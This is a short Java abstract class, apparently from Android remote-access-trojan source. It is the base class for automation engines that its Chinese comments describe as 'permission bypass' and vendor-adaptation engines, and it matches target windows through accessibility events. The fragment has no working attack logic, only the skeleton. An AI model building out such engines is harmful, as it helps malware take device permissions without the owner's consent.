package com.vendor.rat.auto.engine;

import android.view.accessibility.AccessibilityEvent;

/**
 * 自动化引擎基类 (模块 02/03 核心)
 *
 * 所有权限绕过和厂商适配引擎继承此类
 */
public abstract class AutoEngine {

    private boolean finished = false;

    /**
     * 匹配目标窗口
     * @return true = 当前窗口是引擎的目标
     */
    public abstract boolean matchWindow(String packageName, String className);

    /**
     * 窗口匹配成功后的回调
     */
    public abstract void onWindowMatched(String packageName, String className,
                                         AccessibilityEvent event);

    /**
     * 执行引擎逻辑
     */
    public abstract void execute();

    /**
     * 启动引擎
     */
    public void start() {
        finished = false;
        execute();
    }

    /**
     * 标记引擎完成
     */
    public void finish() {
        finished = true;
    }

    public boolean isFinished() { return finished; }
}
